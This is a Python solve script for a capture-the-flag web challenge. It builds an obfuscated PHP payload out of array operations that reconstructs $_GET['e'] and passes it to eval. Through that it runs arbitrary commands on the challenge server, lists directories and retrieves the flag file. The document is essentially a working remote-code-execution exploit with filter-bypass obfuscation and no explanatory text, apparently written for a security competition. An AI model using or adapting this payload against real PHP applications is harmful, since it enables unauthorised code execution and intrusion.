import requests
import urllib
import re

base_url = 'https://until-the-end.secchallenge.crysys.hu'


def rce(cmd):
    # this is php fuck
    stuff = '''
        $a = [];
        $aa = "$a$a";
        $aaa = ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]);
        $aaaaa = ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]);
        $aaaaaa = "[][[]]";
        $w = "$aaaaa$aaaaaa";
        $t = $w  ^ ($aa)[$aaa];
        $aaa = ([] ^ []);
        $aaaa = ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]) + ([] ^ [[]]);
        $w = "$aaa$aaaaaa";
        $w = $w ^ "$aaaa$aaaaaa";
        $e = $w ^ ($aa)[$aaa];
        $e = "_G$e$t";
        $aa = '$';
        $aa ="$aa$e";
        $w='["e"]';
        $aa = "$aa$w";
        eval("eval($aa);");
        '''

    stuff = urllib.parse.quote(stuff)

    cmd = 'echo "qqqqq";' + cmd + 'echo "qqqqq";'
    cmd = urllib.parse.quote(cmd)
    response = requests.get(f'{base_url}?e={cmd}&%2b={stuff}')
    return re.search(r'qqqqq(.*)qqqqq', response.text, re.DOTALL).group(1)


def scandir(dir):
    return rce(f'foreach (scandir("{dir}") as $v) echo $v."\n";')


def solve():
    dirlist = scandir('.')
    hidden_folder = re.search('very.*', dirlist).group()
    subfolder = scandir(hidden_folder)
    assert 'flag' in subfolder
    return requests.get(f'{base_url}/{hidden_folder}/flag').text


if __name__ == "__main__":
    print(solve())
